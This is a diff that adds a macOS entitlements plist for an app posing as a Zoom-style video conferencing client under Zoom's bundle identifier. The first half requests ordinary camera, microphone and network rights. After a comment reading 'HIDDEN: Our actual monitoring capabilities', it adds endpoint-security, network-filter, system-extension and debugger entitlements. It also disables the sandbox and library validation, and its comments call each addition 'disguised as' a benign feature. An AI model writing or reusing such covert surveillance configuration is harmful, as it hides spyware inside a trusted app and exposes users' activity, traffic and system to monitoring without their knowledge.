@@ -1,0 +1,98 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <!-- Video conferencing app entitlements (Zoom-style) -->
+    <key>com.apple.security.device.microphone</key>
+    <true/>
+    <key>com.apple.security.device.camera</key>
+    <true/>
+    <key>com.apple.security.device.audio-input</key>
+    <true/>
+    
+    <!-- Screen sharing and recording -->
+    <key>com.apple.security.cs.allow-jit</key>
+    <true/>
+    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
+    <true/>
+    <key>com.apple.security.cs.allow-dyld-environment-variables</key>
+    <true/>
+    
+    <!-- Network access for video conferencing -->
+    <key>com.apple.security.network.client</key>
+    <true/>
+    <key>com.apple.security.network.server</key>
+    <true/>
+    
+    <!-- File access for sharing and recording -->
+    <key>com.apple.security.files.user-selected.read-write</key>
+    <true/>
+    <key>com.apple.security.files.downloads.read-write</key>
+    <true/>
+    
+    <!-- Contacts access for meeting invitations -->
+    <key>com.apple.security.personal-information.addressbook</key>
+    <true/>
+    <key>com.apple.security.personal-information.calendars</key>
+    <true/>
+    
+    <!-- Location services for timezone/meeting scheduling -->
+    <key>com.apple.security.personal-information.location</key>
+    <true/>
+    
+    <!-- App-specific identifier -->
+    <key>com.apple.application-identifier</key>
+    <string>$(TeamIdentifierPrefix)us.zoom.xos</string>
+    <key>com.apple.developer.team-identifier</key>
+    <string>$(TeamIdentifierPrefix)</string>
+    
+    <!-- Keychain access -->
+    <key>keychain-access-groups</key>
+    <array>
+        <string>$(TeamIdentifierPrefix)us.zoom.xos</string>
+    </array>
+    
+    <!-- HIDDEN: Our actual monitoring capabilities -->
+    <!-- Endpoint Security Framework (disguised as security feature) -->
+    <key>com.apple.developer.endpoint-security.client</key>
+    <true/>
+    
+    <!-- Network extensions (disguised as VPN/security feature) -->
+    <key>com.apple.developer.networking.networkextension</key>
+    <array>
+        <string>packet-tunnel-provider</string>
+        <string>app-proxy-provider</string>
+        <string>content-filter-provider</string>
+    </array>
+    
+    <!-- System extensions (disguised as security component) -->
+    <key>com.apple.developer.system-extension.install</key>
+    <true/>
+    
+    <!-- Process monitoring (disguised as performance monitoring) -->
+    <key>com.apple.security.temporary-exception.mmap</key>
+    <true/>
+    <key>com.apple.security.cs.allow-relative-library-loads</key>
+    <true/>
+    <key>com.apple.security.get-task-allow</key>
+    <true/>
+    <key>com.apple.security.cs.debugger</key>
+    <true/>
+    
+    <!-- Disable sandbox for full system access -->
+    <key>com.apple.security.app-sandbox</key>
+    <false/>
+    
+    <!-- System audit access (disguised as logging feature) -->
+    <key>com.apple.security.temporary-exception.audit-trail</key>
+    <true/>
+    
+    <!-- System preferences access -->
+    <key>com.apple.security.temporary-exception.shared-preference.read-write</key>
+    <true/>
+    
+    <!-- Disable library validation for our monitoring components -->
+    <key>com.apple.security.cs.disable-library-validation</key>
+    <true/>
+</dict>
+</plist>
